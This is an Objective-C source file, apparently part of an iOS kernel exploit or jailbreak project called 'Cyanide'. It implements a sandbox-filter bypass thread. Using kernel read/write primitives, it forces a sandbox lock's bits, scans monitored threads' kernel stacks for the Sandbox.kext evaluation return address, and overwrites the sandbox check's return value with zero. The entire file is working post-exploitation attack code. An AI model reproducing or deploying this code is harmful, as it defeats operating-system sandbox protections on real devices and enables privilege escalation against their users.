//
//  MigFilterBypassThread.m
//  Cyanide
//
//  Created by seo on 3/28/26.
//

#import "MigFilterBypassThread.h"
#import "../kexploit/kexploit_opa334.h"
#import "../kexploit/kutils.h"
#import "../kexploit/krw.h"
#import "../kexploit/xpaci.h"
#import "../utils/process.h"

#import <stdio.h>
#import <stdlib.h>
#import <stdint.h>
#import <stdbool.h>
#import <stdatomic.h>
#import <string.h>
#import <unistd.h>
#import <pthread.h>
#import <sys/time.h>
#import <sys/socket.h>
#import <netinet/in.h>
#import <mach/mach.h>

// from MigFilterBypassThread.js
#define RUN_FLAG_STOP       0
#define RUN_FLAG_RUN        1
#define RUN_FLAG_PAUSE      2

#define KSTACK_READ_SIZE            0x1000
#define KERNEL_SP_OFFSET            (8 * 12)    // Utils.UINT64_SIZE * 12 = 0x60    // p/x offsetof(arm_kernel_saved_state, sp)
#define SB_EVAL_RETVAL_OFFSET       40          // return value is at LR - 40 bytes

// from xnu-11417.140.69/osfmk/kern/lock_rw.h
#define LCK_RW_INTERLOCK_BIT            16
#define LCK_RW_WANT_EXCL_BIT            19
#define LCK_RW_CAN_SLEEP_BIT            22
#define LCK_RW_INTERLOCK                (1U << LCK_RW_INTERLOCK_BIT)
#define LCK_RW_CAN_SLEEP                (1U << LCK_RW_CAN_SLEEP_BIT)    //0x400000
#define LCK_RW_WANT_EXCL                (1U << LCK_RW_WANT_EXCL_BIT)    //0x80000
#define LCK_RW_LOCK_BITS                (LCK_RW_INTERLOCK | LCK_RW_CAN_SLEEP)

// from MigFilterBypassThread.js
uint64_t g_MFB_kernelSlide = 0;
uint64_t g_MFB_migLockOff = 0;
uint64_t g_MFB_migSbxMsgOff = 0;
uint64_t g_MFB_migKernelStackLR = 0;

// Round 15: _Atomic, not volatile — the control functions (start/stop/pause)
// and the monitor thread read/write these lock-free across threads; volatile
// made that a C11 data race (UB, no ordering). Plain loads/stores on the
// _Atomic forms are seq_cst and make the stop/run signaling real.
_Atomic int32_t  g_MFB_runFlag = RUN_FLAG_PAUSE;
_Atomic int32_t  g_MFB_isRunning = 0;
_Atomic uint64_t g_MFB_monitorThread1 = 0;
_Atomic uint64_t g_MFB_monitorThread2 = 0;
 
pthread_t g_MFB_thread = NULL;
bool g_MFB_initialized = false;


uint64_t kstrip(uint64_t addr)
{
    return addr | 0xffffff8000000000ULL;
}

uint64_t trunc_page_16k(uint64_t addr)
{
    return addr & ~0x3FFFULL;
}

uint64_t current_time_ms(void)
{
    struct timeval tv;
    gettimeofday(&tv, NULL);
    return (uint64_t)tv.tv_sec * 1000 + (uint64_t)tv.tv_usec / 1000;
}

void lock_sandbox_lock(void)
{
    // Find "_duplicate_lock" address, which is a "lck_rw_t"
    uint64_t lockAddr = g_MFB_kernelSlide + g_MFB_migLockOff;
    uint64_t sbxMsgAddr = g_MFB_kernelSlide + g_MFB_migSbxMsgOff;
 
    uint32_t lockData = kread32(lockAddr + 0x8);
 
    lockData |= LCK_RW_LOCK_BITS;   // interlock + can_sleep
//    lockData |= (LCK_RW_WANT_EXCL | LCK_RW_CAN_SLEEP);
    kwrite32(lockAddr + 0x8, lockData);
 
    // Do we need to clear this addr while locking too? Or maybe just when we unlock is enough?
    kwrite64(sbxMsgAddr, 0);
}

void unlock_sandbox_lock(void)
{
    uint64_t lockAddr = g_MFB_kernelSlide + g_MFB_migLockOff;
    uint64_t sbxMsgAddr = g_MFB_kernelSlide + g_MFB_migSbxMsgOff;
 
    // clear the sbx message buffer (pointer) used to check for duplicate messages.
    // This should solve an issue with sfree() if we unlock and lock sandbox quick enough.
    kwrite64(sbxMsgAddr, 0);
 
    uint32_t lockData = kread32(lockAddr + 0x8);
 
    lockData &= ~LCK_RW_INTERLOCK;  // interlock
//    lockData &= ~LCK_RW_WANT_EXCL;
    kwrite32(lockAddr + 0x8, lockData);
}

uint64_t find_return_value_offs(uint64_t kernelSP)
{
    // Read from thread kstack, page aligned
    uint64_t pageAddr = trunc_page_16k(kernelSP);
    uint64_t startAddr = pageAddr + 0x3000;
 
    uint64_t buf[KSTACK_READ_SIZE / sizeof(uint64_t)];
    memset(buf, 0, sizeof(buf));
    kreadbuf(startAddr, buf, KSTACK_READ_SIZE);
 
    uint64_t expectedLR = kstrip(g_MFB_kernelSlide + g_MFB_migKernelStackLR);
 
    // Look for 0xxxxxxxxxxxxxx4a4 value, which should be the LSB of LR pointing to Sandbox.kext inside
    // "_sb_evaluate_internal()", so meaning we found the function stack we need (_sb_eval).
    for (int i = 0; i < KSTACK_READ_SIZE / 8; i++) {
        uint64_t val = kstrip(buf[i]);
//        printf("[%s:%d] val = 0x%llx \n", __FUNCTION__, __LINE__, val);
        if (val == expectedLR) {
            // The return value of _eval() is stored in the stack at -40 bytes from LR.
            printf("[%s:%d] found expectedLR !!!!!!!!! \n", __FUNCTION__, __LINE__);
            uint64_t offs = startAddr + (uint64_t)(i * 8) - SB_EVAL_RETVAL_OFFSET;
            return offs;
        }
    }
    return 0;
}

bool disable_filter_on_thread(uint64_t threadAddr)
{
    uint64_t kstack = thread_get_kstackptr(threadAddr);
    if (!kstack)    return false;
 
    kstack = xpaci(kstack);
    
//    uint64_t upcb = kread64(threads + off_thread_machine_upcb);
//    upcb = xpaci(upcb);
    
//    uint64_t state = kstack + off_arm_saved_state_uss_ss_64;
    
//    kwrite64(state + offsetof(struct arm_saved_state64, sp)
    
    uint64_t kernelSP = kread64(kstack + KERNEL_SP_OFFSET);
//    printf("kernelSP = 0x%llx\n", kernelSP);
    if (!kernelSP)  return false;
    
    uint64_t offs = find_return_value_offs(kernelSP);
    if (!offs)  return false;
 
    kwrite64(offs, 0);
 
    printf("[%s:%d] !!!!!!!!!!!!! MIG syscall intercepted for thread: 0x%llx\n", __FUNCTION__, __LINE__, threadAddr);
 
    return true;
}

int wait_for_mig_syscall(int timeout_ms)
{
//    printf("[%s:%d] Wait for MIG syscall...\n", __FUNCTION__, __LINE__);
    uint64_t startTime = current_time_ms();
 
    while (true) {
        int32_t runFlag = g_MFB_runFlag;
        if (runFlag == RUN_FLAG_STOP)
            return RUN_FLAG_STOP;
        if (runFlag == RUN_FLAG_PAUSE)
            return RUN_FLAG_PAUSE;
 
        if (timeout_ms > 0) {
            uint64_t elapsed = current_time_ms() - startTime;
            if (elapsed >= (uint64_t)timeout_ms) {
                printf("[%s:%d] Timeout waiting for a syscall\n", __FUNCTION__, __LINE__);
                break;
            }
        }
 
        uint64_t thread1 = g_MFB_monitorThread1;
        uint64_t thread2 = g_MFB_monitorThread2;
 
        bool filterTriggered = false;
 
        if (thread1 && thread2) {
//            printf("[%s:%d] check monitored threads\n", __FUNCTION__, __LINE__);
            filterTriggered |= disable_filter_on_thread(thread1);
            filterTriggered |= disable_filter_on_thread(thread2);
        } else {
//            printf("[%s:%d] Waiting for monitored threads...\n", __FUNCTION__, __LINE__);
        }
 
        if (filterTriggered)
            break;
        
//        printf("[%s:%d] No MIG syscall detected\n", __FUNCTION__, __LINE__);
        
        usleep(50000+10000);
    }
 
//    printf("[%s:%d] MIG syscall intercepted!\n", __FUNCTION__, __LINE__);
    return RUN_FLAG_RUN;
}

void start_filter_bypass(void)
{
    int run = RUN_FLAG_PAUSE;
 
    while (run) {
        // Handle PAUSE state
        if (run == RUN_FLAG_PAUSE) {
            printf("[%s:%d] Pausing filter bypass\n", __FUNCTION__, __LINE__);
            while (1) {
                run = g_MFB_runFlag;
                if (run != RUN_FLAG_PAUSE) {
                    if (run == RUN_FLAG_RUN)
                        printf("[%s:%d] Resuming filter bypass\n", __FUNCTION__, __LINE__);
                    break;
                }
                usleep(100000+10000);
            }
        }
 
        lock_sandbox_lock();
 
        run = wait_for_mig_syscall(5000*2);
 
        unlock_sandbox_lock();
 
        if (run)
            sched_yield();
    }
}

void *mig_bypass_thread_func(void *arg)
{
    printf("[%s:%d] Thread started\n", __FUNCTION__, __LINE__);
 
    g_MFB_isRunning = 1;
 
    start_filter_bypass();
 
    g_MFB_isRunning = 0;
    printf("[%s:%d] Thread terminated\n", __FUNCTION__, __LINE__);
 
    return NULL;
}

int mig_bypass_init(uint64_t kernelSlide, uint64_t migLockOff, uint64_t migSbxMsgOff, uint64_t migKernelStackLROff)
{
    if (g_MFB_initialized) {
        printf("[%s:%d] Already initialized\n", __FUNCTION__, __LINE__);
        return 0;
    }
 
    g_MFB_kernelSlide = kernelSlide;
    g_MFB_migLockOff = migLockOff;
    g_MFB_migSbxMsgOff = migSbxMsgOff;
    g_MFB_migKernelStackLR = migKernelStackLROff;
 
    g_MFB_runFlag = RUN_FLAG_PAUSE;
    g_MFB_isRunning = 0;
    g_MFB_monitorThread1 = 0;
    g_MFB_monitorThread2 = 0;
 
    printf("[%s:%d] Initialized: kernelSlide=0x%llx, migLock=0x%llx, migSbxMsg=0x%llx, migLR=0x%llx\n",
           __FUNCTION__, __LINE__,
           (unsigned long long)kernelSlide,
           (unsigned long long)migLockOff,
           (unsigned long long)migSbxMsgOff,
           (unsigned long long)migKernelStackLROff);
 
    g_MFB_initialized = true;
    return 0;
}
 
void mig_bypass_start(void)
{
    if (!g_MFB_initialized) {
        printf("[%s:%d] Not initialized\n", __FUNCTION__, __LINE__);
        return;
    }
    if (g_MFB_thread) {
        printf("[%s:%d] Thread already running\n", __FUNCTION__, __LINE__);
        return;
    }
 
    g_MFB_runFlag = RUN_FLAG_PAUSE;
//
    pthread_attr_t pattr;
    pthread_attr_init(&pattr);
    pthread_attr_set_qos_class_np(&pattr, QOS_CLASS_USER_INITIATED, 0);
    int ret = pthread_create(&g_MFB_thread, &pattr, mig_bypass_thread_func, NULL);
//    int ret = pthread_create(&g_MFB_thread, NULL, mig_bypass_thread_func, NULL);
    if (ret != 0) {
        printf("[%s:%d] pthread_create failed: %d\n", __FUNCTION__, __LINE__, ret);
        return;
    }
    pthread_detach(g_MFB_thread);
 
    
    for (int i = 0; i < 10; i++) {
        if (g_MFB_isRunning)
            break;
        usleep(500000+10000);
    }
 
    if (g_MFB_isRunning)
        printf("[%s:%d] Bypass thread started successfully\n", __FUNCTION__, __LINE__);
    else
        printf("[%s:%d] WARNING: Bypass thread may not have started\n", __FUNCTION__, __LINE__);
}
 
void mig_bypass_stop(void)
{
    if (!g_MFB_thread)  return;
 
    g_MFB_runFlag = RUN_FLAG_STOP;
 
    usleep(1100000);
 
    g_MFB_thread = NULL;
    printf("[%s:%d] Stopped\n", __FUNCTION__, __LINE__);
}
 
void mig_bypass_pause(void)
{
    g_MFB_runFlag = RUN_FLAG_PAUSE;
    usleep(1100000);
}
 
void mig_bypass_resume(void)
{
    g_MFB_runFlag = RUN_FLAG_RUN;
    usleep(1100000);
}
 
void mig_bypass_monitor_threads(uint64_t thread1, uint64_t thread2)
{
    g_MFB_monitorThread1 = thread1;
    g_MFB_monitorThread2 = thread2;
}
 
bool mig_bypass_is_running(void)
{
    return g_MFB_isRunning != 0;
}
 
void mig_bypass_destroy(void)
{
    mig_bypass_stop();
 
    g_MFB_kernelSlide        = 0;
    g_MFB_migLockOff        = 0;
    g_MFB_migSbxMsgOff      = 0;
    g_MFB_migKernelStackLR  = 0;
    g_MFB_monitorThread1    = 0;
    g_MFB_monitorThread2    = 0;
    g_MFB_initialized       = false;
 
    printf("[%s:%d] Destroyed\n", __FUNCTION__, __LINE__);
}
